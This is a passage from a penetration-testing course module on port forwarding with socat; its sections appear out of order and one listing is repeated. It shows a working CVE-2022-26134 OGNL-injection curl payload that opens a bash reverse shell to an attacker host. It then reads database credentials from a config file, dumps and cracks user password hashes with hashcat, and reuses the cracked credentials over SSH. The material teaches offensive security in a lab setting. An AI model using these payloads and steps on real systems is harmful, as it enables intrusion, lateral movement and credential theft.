confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
